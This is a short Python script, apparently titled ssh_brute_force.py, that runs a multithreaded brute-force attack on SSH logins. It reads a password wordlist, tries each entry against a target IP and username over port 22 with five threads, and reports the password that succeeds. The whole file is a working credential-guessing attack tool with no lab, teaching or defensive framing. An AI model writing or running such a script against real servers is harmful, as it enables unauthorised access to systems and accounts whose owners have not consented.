import paramiko
import sys
import threading
import queue

if len(sys.argv) < 4:
    print("Usage: ssh_brute_force.py [TARGET_IP] [USERNAME] [PASSWORDS_WORDLIST]")
    exit(0)

target = str(sys.argv[1])
username = str(sys.argv[2])
password_file = str(sys.argv[3])

q = queue.Queue()
found_pass = False

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

def handle_thread(q):
    global found_pass
    while not found_pass and q.qsize() > 0:
        password = q.get()
        print('testing password: ' + password)
        try:
            response = ssh_connect(password)

            if response == 0:
                print('password found: '+ password)
                found_pass = True
                exit(0)
        except Exception as e:
            print(e)
        pass

def start_threads(num):
    global threads
    threads = []
    for _ in range(num):
        threads.append(threading.Thread(target=handle_thread, args=(q,)))
        threads[-1].start()

with open(password_file, 'r') as file:
    for line in file.readlines():
        q.put(line.strip())
        # password = line.strip()
    start_threads(5)


